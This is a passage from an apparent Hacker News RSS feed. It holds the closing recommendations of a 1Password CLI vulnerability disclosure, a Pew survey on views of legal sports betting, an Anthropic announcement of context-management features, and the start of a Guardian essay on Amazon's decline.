    &lt;/list&gt;
    &lt;p&gt;I strongly recommend that 1Password modify their product to resolve this problem. Just spitballing, I think any of the following would be sufficient (this is an OR, not an AND):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allow users to limit access to vaults using CLI integrations&lt;/item&gt;
      &lt;item&gt;Allow users to designate individual items in their Vaults for use with the CLI&lt;/item&gt;
      &lt;item&gt;Prompt for specific vaults or items individually&lt;/item&gt;
      &lt;item&gt;Prompt for each process individually, closing the gap for subprocesses&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This investigation took a while, and I waited a while before publishing this disclosure (life circumstances and giving 1Password time to fix the issue). While 1Password is within their right not to issue a CVE or a fix for this vulnerability, I do think 1Password users (I am proud to be one) would be much safer if this issue were eliminated.&lt;/p&gt;
    &lt;p&gt;Thanks, please contact me with any corrections or feedback.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478553</guid><pubDate>Sun, 05 Oct 2025 03:01:50 +0000</pubDate></item><item><title>Americans increasingly see legal sports betting as a bad thing for society</title><link>https://www.pewresearch.org/short-reads/2025/10/02/americans-increasingly-see-legal-sports-betting-as-a-bad-thing-for-society-and-sports/</link><description>&lt;doc fingerprint="59d2d4ad970264c6"&gt;
  &lt;main&gt;
    &lt;p&gt;Public awareness of legal sports betting has grown in recent years – and so has the perception that it is a bad thing for society and sports, according to a new Pew Research Center survey.&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;For society (July 2022)&lt;/cell&gt;
        &lt;cell role="head"&gt;For society (July 2025)&lt;/cell&gt;
        &lt;cell role="head"&gt;For sports (July 2022)&lt;/cell&gt;
        &lt;cell role="head"&gt;For sports (July 2025)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;A bad thing&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
        &lt;cell&gt;33%&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;A good thing&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
        &lt;cell&gt;7%&lt;/cell&gt;
        &lt;cell&gt;16%&lt;/cell&gt;
        &lt;cell&gt;17%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Neither good nor bad&lt;/cell&gt;
        &lt;cell&gt;57%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
        &lt;cell&gt;49%&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;Today, 43% of U.S. adults say the fact that sports betting is now legal in much of the country is a bad thing for society. That’s up from 34% in 2022. And 40% of adults now say it’s a bad thing for sports, up from 33%.&lt;/p&gt;
    &lt;p&gt;Despite these increasingly critical views of legal sports betting, many Americans continue to say it has neither a bad nor good impact on society and on sports. Fewer than one-in-five see positive impacts.&lt;/p&gt;
    &lt;p&gt;Meanwhile, the share of Americans who have bet money on sports in the past year has not changed much since 2022.&lt;/p&gt;
    &lt;p&gt;Today, 22% of adults say they’ve personally bet money on sports in the past year. That’s a slight uptick from 19% three years ago. This figure includes betting in any of three ways:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;With friends or family, such as in a private betting pool, fantasy league or casual bet&lt;/item&gt;
      &lt;item&gt;Online with a betting app, sportsbook or casino&lt;/item&gt;
      &lt;item&gt;In person at a casino, racetrack or betting kiosk&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;July 2022&lt;/cell&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;With friends and family, such as in a private betting pool, fantasy league or casual bet&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Online with a betting app, sportsbook or casino&lt;/cell&gt;
        &lt;cell&gt;6%&lt;/cell&gt;
        &lt;cell&gt;10%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;In person at a casino, racetrack or betting kiosk&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
        &lt;cell&gt;8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;ANY of the above ways&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;All of this increase has come through online sports betting: 10% of adults now say they’ve placed a bet this way in the past year, up from 6% in 2022. There has been no change in the shares of adults who have bet on sports with family or friends or in person at a casino, racetrack or betting kiosk.&lt;/p&gt;
    &lt;p&gt;Commercial sports betting has spread rapidly across the United States since a Supreme Court ruling in 2018 gave states the green light to legalize it. At least 38 states, the District of Columbia and Puerto Rico now allow commercial sports betting in some form, according to the National Conference of State Legislatures.&lt;/p&gt;
    &lt;p&gt;In our new survey, 63% of adults say they’ve heard or read a lot or a little about the fact that sports betting is now legal in much of the U.S. That’s up from 56% in 2022. The increase in public awareness comes as betting-related advertisements have become common during sports broadcasts.&lt;/p&gt;
    &lt;p&gt;The rest of this analysis takes a closer look at Americans’ views of and experiences with sports betting. It’s based on the survey of 9,916 U.S. adults, conducted in July and August.&lt;/p&gt;
    &lt;head rend="h4"&gt;Many demographic groups increasingly view legal sports betting as a bad thing&lt;/head&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;July 2022&lt;/cell&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;U.S. adults&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Men&lt;/cell&gt;
        &lt;cell&gt;35%&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Women&lt;/cell&gt;
        &lt;cell&gt;33%&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Ages 18-29&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
        &lt;cell&gt;41%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;30-49&lt;/cell&gt;
        &lt;cell&gt;29%&lt;/cell&gt;
        &lt;cell&gt;39%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;50-64&lt;/cell&gt;
        &lt;cell&gt;37%&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;65+&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
        &lt;cell&gt;49%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;White&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
        &lt;cell&gt;46%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Black&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Hispanic&lt;/cell&gt;
        &lt;cell&gt;29%&lt;/cell&gt;
        &lt;cell&gt;37%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Asian*&lt;/cell&gt;
        &lt;cell&gt;42%&lt;/cell&gt;
        &lt;cell&gt;48%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;College grad&lt;/cell&gt;
        &lt;cell&gt;39%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Non-college grad&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
        &lt;cell&gt;38%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Upper income&lt;/cell&gt;
        &lt;cell&gt;40%&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Middle income&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;44%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Lower income&lt;/cell&gt;
        &lt;cell&gt;28%&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Rep/Lean Rep&lt;/cell&gt;
        &lt;cell&gt;38%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Dem/Lean Dem&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
        &lt;cell&gt;43%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Sports bettor&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Non-sports bettor&lt;/cell&gt;
        &lt;cell&gt;36%&lt;/cell&gt;
        &lt;cell&gt;45%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;Since 2022, Americans in many demographic groups have become more likely to view the widespread legalization of sports betting as a bad thing for society, as well as for sports.&lt;/p&gt;
    &lt;p&gt;This is true for men and women; college graduates and non-college graduates; and upper-, middle- and lower-income Americans alike. It is also the case among Democrats and Republicans, as well as among those who have personally placed a sports bet in the past year and those who have not.&lt;/p&gt;
    &lt;p&gt;Some of the biggest shifts in attitudes about sports betting’s societal impact have come among young Americans – especially young men. Today, 47% of men under 30 say legal sports betting is a bad thing for society, up from 22% who said this in 2022. Women under 30 have also become more likely to express this view: 35% see legal sports betting as bad for society, up from 25% three years ago.&lt;/p&gt;
    &lt;p&gt;The legalization of sports betting has generated revenue for state governments and gambling operators, but it has also raised concerns about gambling addiction and other societal harms. Critics have also cautioned that it may compromise the integrity of sports. In recent years, several professional and college athletes and team personnel have been punished for violating betting rules.&lt;/p&gt;
    &lt;head rend="h4"&gt;Who has bet money on sports in the past year?&lt;/head&gt;
    &lt;p&gt;Note: White, Black and Asian adults include those who report being only one race and not Hispanic. Hispanic adults are of any race. Family income tiers are based on adjusted 2024 earnings. The full question wording was “With friends or family (such as a private betting pool, fantasy league, or casual bet).”&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;July 2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;U.S. adults&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Men&lt;/cell&gt;
        &lt;cell&gt;25%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Women&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Ages 18-29&lt;/cell&gt;
        &lt;cell&gt;31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;30-49&lt;/cell&gt;
        &lt;cell&gt;26%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;50-64&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;65+&lt;/cell&gt;
        &lt;cell&gt;12%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;White&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Black&lt;/cell&gt;
        &lt;cell&gt;30%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Hispanic&lt;/cell&gt;
        &lt;cell&gt;27%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Asian*&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;College grad&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Non-college grad&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Upper income&lt;/cell&gt;
        &lt;cell&gt;26%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Middle income&lt;/cell&gt;
        &lt;cell&gt;23%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Lower income&lt;/cell&gt;
        &lt;cell&gt;21%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Rep/Lean Rep&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Dem/Lean Dem&lt;/cell&gt;
        &lt;cell&gt;24%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Note: White, Black and Asian adults include those who report being only one race and not Hispanic. Hispanic adults are of any race. Family income tiers are based on adjusted 2024 earnings. The full question wording was “With friends or family (such as a private betting pool, fantasy league, or casual bet).”&lt;/p&gt;
    &lt;p&gt;Source: Survey of U.S. adults conducted July 8-Aug. 3, 2025.&lt;/p&gt;
    &lt;p&gt;As was the case in 2022, some groups of Americans are more likely than others to say they’ve personally bet money on sports in the past year in any of the ways we asked about.&lt;/p&gt;
    &lt;p&gt;Young adults are more likely than older Americans to say they’ve placed a sports bet in the past year. Some 31% of adults under 30 say this, including 36% of men and 29% of women in this age group. Sports betting is less common in all older age groups.&lt;/p&gt;
    &lt;p&gt;Black and Hispanic adults are also especially likely to have bet money on sports in the past year: 30% and 27%, respectively, say they have done so. Roughly two-in-ten Asian (22%) and White (19%) adults say the same.&lt;/p&gt;
    &lt;p&gt;There are no differences between college graduates and non-college graduates on this question. In each group, 22% say they have bet on sports in the past year. Nor are there major partisan differences: 24% of Democrats and Democratic-leaning independents say they have done so, as have 22% of Republicans and Republican leaners.&lt;/p&gt;
    &lt;head rend="h4"&gt;Who has placed an online sports bet in the past year?&lt;/head&gt;
    &lt;p&gt;When it comes to online sports betting, young adults and Black Americans again stand out.&lt;/p&gt;
    &lt;p&gt;Overall, 17% of adults under 30 – including 21% of men and 16% of women in this age group – say they’ve placed an online sports wager in the past year. Three years ago, 7% of those under 30 had done so – including 9% of men and 6% of women.&lt;/p&gt;
    &lt;p&gt;Among Black adults, 19% say they’ve placed an online sports bet in the past year, up from 10% in 2022. Smaller shares of Hispanic (12%), Asian (11%) and White (8%) adults say they’ve done this in the past year.&lt;/p&gt;
    &lt;p&gt;Note: Senior Writer Drew DeSilver and Research Analyst Ted Van Green contributed to this analysis. Here are the questions used, the topline and the survey methodology.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478749</guid><pubDate>Sun, 05 Oct 2025 04:01:57 +0000</pubDate></item><item><title>Ambigr.am</title><link>https://ambigr.am/hall-of-fame</link><description>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478780</guid><pubDate>Sun, 05 Oct 2025 04:11:55 +0000</pubDate></item><item><title>Anthropic Release Memory API</title><link>https://www.anthropic.com/news/context-management</link><description>&lt;doc fingerprint="bf43ca3f38eb8046"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Managing context on the Claude Developer Platform&lt;/head&gt;
    &lt;p&gt;Today, we’re introducing new capabilities for managing your agents’ context on the Claude Developer Platform: context editing and the memory tool.&lt;/p&gt;
    &lt;p&gt;With our latest model, Claude Sonnet 4.5, these capabilities enable developers to build AI agents capable of handling long-running tasks at higher performance and without hitting context limits or losing critical information.&lt;/p&gt;
    &lt;head rend="h2"&gt;Context windows have limits, but real work doesn’t&lt;/head&gt;
    &lt;p&gt;As production agents handle more complex tasks and generate more tool results, they often exhaust their effective context windows—leaving developers stuck choosing between cutting agent transcripts or degrading performance. Context management solves this in two ways, helping developers ensure only relevant data stays in context and valuable insights get preserved across sessions.&lt;/p&gt;
    &lt;p&gt;Context editing automatically clears stale tool calls and results from within the context window when approaching token limits. As your agent executes tasks and accumulates tool results, context editing removes stale content while preserving the conversation flow, effectively extending how long agents can run without manual intervention. This also increases the effective model performance as Claude focuses only on relevant context.&lt;/p&gt;
    &lt;p&gt;The memory tool enables Claude to store and consult information outside the context window through a file-based system. Claude can create, read, update, and delete files in a dedicated memory directory stored in your infrastructure that persists across conversations. This allows agents to build up knowledge bases over time, maintain project state across sessions, and reference previous learnings without having to keep everything in context.&lt;/p&gt;
    &lt;p&gt;The memory tool operates entirely client-side through tool calls. Developers manage the storage backend, giving them complete control over where the data is stored and how it’s persisted.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 enhances both capabilities with built-in context awareness—tracking available tokens throughout conversations to manage context more effectively.&lt;/p&gt;
    &lt;p&gt;Together, these updates create a system that improves agent performance:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable longer conversations by automatically removing stale tool results from context&lt;/item&gt;
      &lt;item&gt;Boost accuracy by saving critical information to memory—and bring that learning across successive agentic sessions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Building long-running agents&lt;/head&gt;
    &lt;p&gt;Claude Sonnet 4.5 is the best model in the world for building agents. These features unlock new possibilities for long-running agents—processing entire codebases, analyzing hundreds of documents, or maintaining extensive tool interaction histories. Context management builds on this foundation, ensuring agents can leverage this expanded capacity efficiently while still handling workflows that extend beyond any fixed limit. Use cases include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Coding: Context editing clears old file reads and test results while memory preserves debugging insights and architectural decisions, enabling agents to work on large codebases without losing progress.&lt;/item&gt;
      &lt;item&gt;Research: Memory stores key findings while context editing removes old search results, building knowledge bases that improve performance over time.&lt;/item&gt;
      &lt;item&gt;Data processing: Agents store intermediate results in memory while context editing clears raw data, handling workflows that would otherwise exceed token limits.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Performance improvements with context management&lt;/head&gt;
    &lt;p&gt;On an internal evaluation set for agentic search, we tested how context management improves agent performance on complex, multi-step tasks. The results demonstrate significant gains: combining the memory tool with context editing improved performance by 39% over baseline. Context editing alone delivered a 29% improvement.&lt;/p&gt;
    &lt;p&gt;In a 100-turn web search evaluation, context editing enabled agents to complete workflows that would otherwise fail due to context exhaustion—while reducing token consumption by 84%.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;These capabilities are available today in public beta on the Claude Developer Platform, natively and in Amazon Bedrock and Google Cloud’s Vertex AI. Explore the documentation for context editing and the memory tool, or visit our cookbook to learn more.&lt;/p&gt;
    &lt;p&gt;Anthropic is not affiliated with, endorsed by, or sponsored by CATAN GmbH or CATAN Studio. The CATAN trademark and game are the property of CATAN GmbH.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479006</guid><pubDate>Sun, 05 Oct 2025 05:20:08 +0000</pubDate></item><item><title>Way past its prime: how did Amazon get so rubbish?</title><link>https://www.theguardian.com/technology/2025/oct/05/way-past-its-prime-how-did-amazon-get-so-rubbish</link><description>&lt;doc fingerprint="ace0994005b6059c"&gt;
  &lt;main&gt;
    &lt;p&gt;It’s not just you. The internet is getting worse, fast. The services we rely on, that we once loved? They’re all turning into piles of shit, all at once. Ask any Facebook user who has to scroll past 10 screens of engagement-bait, AI slop and surveillance ads just to get to one post by the people they are on the service to communicate with. This is infuriating. Frustrating. And, depending on how important those services are to you, terrifying.&lt;/p&gt;
    &lt;p&gt;In 2022, I coined a term to describe the sudden-onset platform collapse going on all around us: enshittification. To my bittersweet satisfaction, that word is doing big numbers. In fact, it has achieved escape velocity. It isn’t just a way to say something got worse. It’s an analysis that explains the way an online service gets worse, how that worsening unfolds, and the contagion that’s causing everything to get worse, all at once.&lt;/p&gt;
    &lt;p&gt;This moment we’re living through, this Great Enshittening, is a material phenomenon, much like a disease, with symptoms, a mechanism and an epidemiology. When doctors observe patients who are sick with a novel pathogen, their first order of business is creating a natural history of the disease. This natural history is an ordered catalogue of the disease’s progress: what symptoms do patients exhibit, and in which order?&lt;/p&gt;
    &lt;p&gt;Here’s the natural history of enshittification:&lt;lb/&gt;1 First, platforms are good to their users.&lt;lb/&gt;2 Then they abuse their users to make things better for their business customers.&lt;lb/&gt;3 Next, they abuse those customers to claw back all the value for themselves – and become a giant pile of shit.&lt;/p&gt;
    &lt;p&gt;This pattern is everywhere. Once you learn about it, you’ll start seeing it, too. Take Amazon, a company that started out by making it possible to have any book shipped to your door and then became the only game in town for everything else, even as it dodged taxes and filled up with self-immolating crapgadgets and other junk.&lt;/p&gt;
    &lt;p&gt;In Jeff Bezos’s original business plan for Amazon, the company was called Relentless. Critics say that this is a reference to Bezos’s cutthroat competitive instincts, but Bezos always insisted that it was a reference to his company’s relentless commitment to customer service.&lt;/p&gt;
    &lt;p&gt;How did Amazon go from a logistics company that got packages to you quickly and efficiently to a behemoth of digital content defined by the Prime experience (which has much less to do with free shipping now and more with everything else)?&lt;/p&gt;
    &lt;head rend="h2"&gt;Stage 1: good to users&lt;/head&gt;
    &lt;p&gt;Amazon started with a large surplus of cash that it was able to allocate to its customers, and allocate it did. The company raised a fortune from early investors, then a larger fortune by listing on the stock market. Then it used that fortune to subsidise many goods, selling them below cost. It also subsidised shipping and offered a no-questions-asked, postage-paid returns policy.&lt;/p&gt;
    &lt;p&gt;This offer tempted millions of users to pile on to the platform. Once they were there, Prime membership went a long way to locking them in. Paying for shipping a year in advance is a powerful incentive to do your shopping on Amazon. Indeed, the overwhelming majority of Prime subscribers begin their e-commerce searches on Amazon and, if they find what they’re looking for, don’t shop around for a better deal.&lt;/p&gt;
    &lt;p&gt;You can think of Prime as a form of soft lock-in, Amazon binding you to its platform with a silken ribbon. But Amazon’s also got some iron chains in its toolbox. All the audiobooks and movies, and most of the ebooks and emagazines, you buy from Amazon are permanently locked to its platform.&lt;/p&gt;
    &lt;p&gt;They are sold with digital rights management (DRM), a form of encryption designed to force you to view or listen using apps that Amazon controls. Break up with Amazon and delete your apps, and you will lose all the media you’ve ever bought from the platform. For a certain kind of reader, listener or movie buff, this is a very high switching cost indeed.&lt;/p&gt;
    &lt;p&gt;Amazon has one more trick up its sleeve: after years of selling goods below cost, it has completed the work that big box stores started, eliminating swaths of small, independent, brick-and-mortar businesses. Its online predatory pricing tactics have done the same for much of the e-commerce world.&lt;/p&gt;
    &lt;p&gt;That means shopping anywhere other than Amazon has become substantially more inconvenient. These tactics – Prime, DRM and predatory pricing – make it very hard not to shop at Amazon. With users locked in, to proceed with the enshittification playbook, Amazon needed to get its business customers locked in, too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Stage 2: abusing users, good to businesses&lt;/head&gt;
    &lt;p&gt;Amazon was initially very good to those business customers. It paid full price for their goods, then sold them below cost to its customers. It subsidised returns and customer service, too. It ran a clean search engine, which put the best matches for shoppers’ queries at the top of the page, creating a path to glory merchants could walk merely by selling quality goods at fair prices.&lt;/p&gt;
    &lt;p&gt;Then, once those merchants were locked in, Amazon put the screws on them. Amazon brags about this technique, which it calls “the flywheel”. It brings in users with low prices and a large selection. This attracts merchants who are eager to sell to those users. The merchants’ dependence on those customers allows Amazon to extract higher discounts from those merchants, and that brings in more users, which makes the platform even more indispensable for merchants, allowing the company to require even deeper discounts – and around and around the flywheel spins.&lt;/p&gt;
    &lt;p&gt;Let’s take a step back. This flywheel is the direct product of a radical legal theory that has had the world in its grip since the late 1970s. From the 1890s until the Jimmy Carter administration, US corporations’ power was blunted by antitrust law, which treated large companies as threats simply because they were large. Once a company is too big to fail, it becomes too big to jail, and then too big to care. Antitrust law was designed to fight that apathy and force companies to care.&lt;/p&gt;
    &lt;p&gt;A rival – and frankly terrible – theory of antitrust law says that the only time a government should intervene against a monopolist is when it is sure that the monopolist is using its scale to raise prices or lower quality. This is the consumer welfare standard theory and its premise is that when we find monopolies in the wild, they are almost certainly large and powerful thanks to the quality of their offerings. Any time you find that people all buy the same goods from the same store, you should assume that this is the very best store, selling the very best goods. It would be perverse (goes the theory) for the government to harass companies for being so excellent that everyone loves them.&lt;/p&gt;
    &lt;p&gt;It was under this theory that Jimmy Carter started to remove a few of the Jenga blocks from the antitrust system. Then Ronald Reagan came along and tore them out by the fistful. (Most of the rightwing policies for which we remember Reagan started under Carter, who was hoping to woo conservative voters. He failed.) Every president since – Republican or Democrat – has followed Reagan’s example, up to (but not including) Joe Biden.&lt;/p&gt;
    &lt;p&gt;The Amazon flywheel is designed to fit neatly into the consumer welfare framework. It proclaims itself to be an enemy to merchants on behalf of consumers. The flywheel is all about lowering prices, and the consumer welfare standard theory prizes low prices above all else.&lt;/p&gt;
    &lt;head rend="h2"&gt;Stage 3: a giant pile of shit&lt;/head&gt;
    &lt;p&gt;Amazon has a myriad of tactics at its disposal for shifting value from business customers to itself, some of which also involve shifting value away from end users, no matter what the cute flywheel pitch says.&lt;/p&gt;
    &lt;p&gt;It uses its overview of merchants’ sales, as well as its ability to observe the return addresses on direct shipments from merchants’ contracting factories, to cream off its merchants’ bestselling items and clone them, relegating the original seller to page umpty-million of its search results.&lt;/p&gt;
    &lt;p&gt;Amazon also crushes its merchants under a mountain of junk fees pitched as optional but effectively mandatory. Take Prime: a merchant has to give up a huge share of each sale to be included in Prime, and merchants that don’t use Prime are pushed so far down in the search results, they might as well cease to exist.&lt;/p&gt;
    &lt;p&gt;Same with Fulfilment by Amazon, a “service” in which a merchant sends its items to an Amazon warehouse to be packed and delivered with Amazon’s own inventory. This is far more expensive than comparable (or superior) shipping services from rival logistics companies, and a merchant that ships through one of those rivals is, again, relegated even farther down the search rankings.&lt;/p&gt;
    &lt;p&gt;All told, Amazon makes so much money charging merchants to deliver the wares they sell through the platform that its own shipping is fully subsidised. In other words, Amazon gouges its merchants so much that it pays nothing to ship its own goods, which compete directly with those merchants’ goods.&lt;/p&gt;
    &lt;p&gt;Here’s where Amazon’s attacks on its merchants’ bottom lines turn into higher prices for its customers. A merchant that pays Amazon through the nose needs to make up the money somewhere. Hypothetically, merchants could eat Amazon’s fees themselves – in other words, if Amazon wants a 10% fee on an item with a 20% profit margin, the seller could split the difference, and settle for a 10% profit.&lt;/p&gt;
    &lt;p&gt;But Amazon’s fee isn’t 10%. Add all the junk fees together and an Amazon seller is being screwed out of 45-51 cents on every dollar it earns there. Even if it wanted to absorb the “Amazon tax” on your behalf, it couldn’t. Merchants just don’t make 51% margins.&lt;/p&gt;
    &lt;p&gt;So merchants must jack up prices, which they do. A lot. Now, you may have noticed that Amazon’s prices aren’t any higher than the prices that you pay elsewhere. There’s a good reason for that: when merchants raise their prices on Amazon, they are required to raise their prices everywhere else, even on their own direct-sales stores. This arrangement is called most-favoured-nation status, and it’s key to the US Federal Trade Commission’s antitrust lawsuit against Amazon.&lt;/p&gt;
    &lt;p&gt;Let the implications of most-favoured nation settle in. If Amazon is taxing merchants 45-51 cents on every dollar they make, and if merchants are hiking their prices everywhere their goods are sold, then it follows you’re paying the Amazon tax no matter where you shop – even the corner mom-and-pop hardware store.&lt;/p&gt;
